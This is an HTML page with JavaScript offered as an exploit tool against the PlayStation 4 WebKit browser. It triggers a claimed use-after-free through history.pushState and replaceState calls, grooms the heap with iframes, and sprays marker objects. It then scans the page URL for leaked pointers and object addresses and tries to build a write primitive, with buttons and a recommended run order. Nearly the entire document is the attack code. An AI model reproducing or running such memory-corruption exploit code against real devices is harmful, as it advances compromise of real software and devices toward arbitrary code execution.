<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit UAF - Address Leak</title>

</head>
<body>
<h2>üéØ PS4 WebKit UAF - Address Leak Primitive</h2>
<p>Status: <span id="status">Ready</span></p>

<button onclick="runLeakBasic()">LEAK 1 - Basic Pattern Scan</button>
<button onclick="runLeakPointers()">LEAK 2 - Pointer Extraction</button>
<button onclick="runLeakObjects()">LEAK 3 - Object Address Leak</button>
<button onclick="runWriteAttempt()">WRITE - Attempt Write Primitive</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function log(m, cls=""){ 
  const span = document.createElement("span");
  if(cls) span.className = cls;
  span.textContent = m + "\n";
  logEl.appendChild(span);
}
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

// Core UAF trigger (proven to work)
async function triggerUAF() {
    let size = 977;
    const STEP = 14461;
    
    for(let i=0; i<48; i++){
        let char = String.fromCharCode(0x41 + (i % 26));
        let frag = char.repeat(size);
        
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
        
        size += STEP;
        await sleep(5);
    }
    
    await sleep(120);
    
    // Heap grooming
    let frames = [];
    for(let i=0; i<80; i++){
        let f = document.createElement("iframe");
        document.body.appendChild(f);
        try {
            let d = f.contentDocument;
            d.open();
            d.write("<html><body>" + ("X".repeat(2048)) + "</body></html>");
            d.close();
        } catch(e){}
        frames.push(f);
    }
    frames.forEach(f=>f.remove());
    
    await sleep(80);
}

// -------------------------------------------------
// LEAK 1 - Basic Pattern Scan
// -------------------------------------------------
async function runLeakBasic(){
    logEl.textContent = "";
    statusEl.textContent = "Running LEAK 1...";
    
    log("=== LEAK 1: Basic Pattern Scan ===", "critical");
    
    await triggerUAF();
    
    let url = document.URL;
    log(`\nURL Length: ${url.length}`, "success");
    log(`First 100 chars: ${url.substring(0,100)}`);
    log(`Last 100 chars: ${url.substring(url.length-100)}\n`);
    
    // Scan for patterns
    log("[PATTERN SCAN]");
    for(let i=0; i<26; i++){
        let char = String.fromCharCode(0x41 + i);
        let pattern = char.repeat(10);
        let idx = url.indexOf(pattern);
        
        if(idx !== -1){
            log(`  ${char}: Found at offset ${idx}`, "success");
        }
    }
    
    statusEl.textContent = "LEAK 1 Complete";
    log("\n=== LEAK 1 END ===");
}

// -------------------------------------------------
// LEAK 2 - Pointer Extraction
// -------------------------------------------------
async function runLeakPointers(){
    logEl.textContent = "";
    statusEl.textContent = "Running LEAK 2...";
    
    log("=== LEAK 2: Pointer Extraction ===", "critical");
    log("Scanning for non-ASCII bytes (potential pointers)\n");
    
    await triggerUAF();
    
    let url = document.URL;
    let candidates = [];
    
    // Scan for 4-byte aligned potential pointers
    for(let i=0; i<Math.min(url.length-4, 100000); i+=4){
        let b0 = url.charCodeAt(i);
        let b1 = url.charCodeAt(i+1);
        let b2 = url.charCodeAt(i+2);
        let b3 = url.charCodeAt(i+3);
        
        // Check if looks like a pointer (non-zero, reasonable range)
        if(b0 > 0 && (b2 > 0 || b3 > 0)){
            let addr = b0 | (b1 << 8) | (b2 << 16) | (b3 << 24);
            
            // PS4 addresses typically in range 0x00000000 - 0x7fffffff
            if(addr > 0x1000 && addr < 0x7fffffff){
                candidates.push({offset: i, addr: addr});
            }
        }
    }
    
    log(`[CANDIDATES] Found ${candidates.length} potential pointers\n`);
    
    // Show top 20
    candidates.slice(0, 20).forEach(c => {
        log(`  Offset ${c.offset}: 0x${c.addr.toString(16).padStart(8,'0')}`, "pointer");
    });
    
    if(candidates.length > 0){
        log(`\n‚úÖ SUCCESS: Potential address leak found!`, "success");
        log(`First candidate: 0x${candidates[0].addr.toString(16)}`, "critical");
    } else {
        log(`\n‚ö†Ô∏è No obvious pointers found`, "warn");
        log(`Memory may be zeroed or obfuscated`);
    }
    
    statusEl.textContent = "LEAK 2 Complete";
    log("\n=== LEAK 2 END ===");
}

// -------------------------------------------------
// LEAK 3 - Object Address Leak
// -------------------------------------------------
async function runLeakObjects(){
    logEl.textContent = "";
    statusEl.textContent = "Running LEAK 3...";
    
    log("=== LEAK 3: Object Address Leak ===", "critical");
    log("Strategy: Spray objects, trigger UAF, scan for object pointers\n");
    
    // Spray recognizable objects
    log("[SPRAY] Creating marker objects...");
    let spray = [];
    for(let i=0; i<1000; i++){
        spray.push({
            marker: 0xdeadbeef + i,
            index: i,
            data: new Array(32).fill(0x41414141)
        });
    }
    log(`  Sprayed ${spray.length} objects\n`, "success");
    
    await sleep(100);
    
    await triggerUAF();
    
    let url = document.URL;
    log(`URL Length: ${url.length}\n`);
    
    // Scan for marker values (0xdeadbeef pattern)
    log("[MARKER SCAN]");
    let found = 0;
    for(let i=0; i<Math.min(url.length-4, 200000); i++){
        let val = 
            url.charCodeAt(i) |
            (url.charCodeAt(i+1) << 8) |
            (url.charCodeAt(i+2) << 16) |
            (url.charCodeAt(i+3) << 24);
        
        if((val & 0xffffff00) === 0xdeadbe00){
            let idx = val - 0xdeadbeef;
            log(`  Found marker at offset ${i}: 0x${val.toString(16)} (object ${idx})`, "critical");
            found++;
        }
    }
    
    if(found > 0){
        log(`\nüéØ CRITICAL: Found ${found} object markers in leaked memory!`, "critical");
        log(`This confirms objects are adjacent to freed HistoryItem`, "success");
    } else {
        log(`\nNo markers found - objects may not be adjacent`, "warn");
    }
    
    statusEl.textContent = "LEAK 3 Complete";
    log("\n=== LEAK 3 END ===");
}

// -------------------------------------------------
// WRITE - Attempt Write Primitive
// -------------------------------------------------
async function runWriteAttempt(){
    logEl.textContent = "";
    statusEl.textContent = "Running WRITE...";
    
    log("=== WRITE: Attempting Write Primitive ===", "critical");
    log("Strategy: Use location.hash to write controlled data\n");
    
    await triggerUAF();
    
    let url_before = document.URL;
    log(`URL before: length=${url_before.length}`);
    log(`  First 50: ${url_before.substring(0,50)}\n`);
    
    // Attempt to write via location.hash
    log("[WRITE] Setting controlled hash...", "warn");
    
    // Create controlled payload
    let payload = "";
    for(let i=0; i<1000; i++){
        // Write pattern: 0x41424344...
        payload += String.fromCharCode(0x41, 0x42, 0x43, 0x44);
    }
    
    location.hash = "#" + payload;
    
    await sleep(100);
    
    // Try to read back
    log("[READ] Checking if write succeeded...\n");
    
    // Navigate to trigger potential read of written data
    try {
        history.back();
        await sleep(100);
        
        let url_after = document.URL;
        log(`URL after: length=${url_after.length}`);
        
        if(url_after.includes("ABCD")){
            log(`\nüö® CRITICAL: Write pattern found in URL!`, "critical");
            log(`Write primitive may be working!`, "success");
        } else {
            log(`\nWrite pattern not found`, "warn");
            log(`URL: ${url_after.substring(0,100)}`);
        }
    } catch(e){
        log(`\nException during write test: ${e.message}`, "warn");
    }
    
    statusEl.textContent = "WRITE Complete";
    log("\n=== WRITE END ===");
}

log("PS4 WebKit UAF - Address Leak Primitive");
log("Status: UAF Read confirmed working (pattern 'V' leaked)");
log("\nTests:");
log("1. LEAK 1 - Scan for recognizable patterns");
log("2. LEAK 2 - Extract potential pointers");
log("3. LEAK 3 - Leak object addresses");
log("4. WRITE - Attempt write primitive");
log("\nRecommended: Run in order 1 ‚Üí 2 ‚Üí 3 ‚Üí 4");
</script>
</body>
</html>
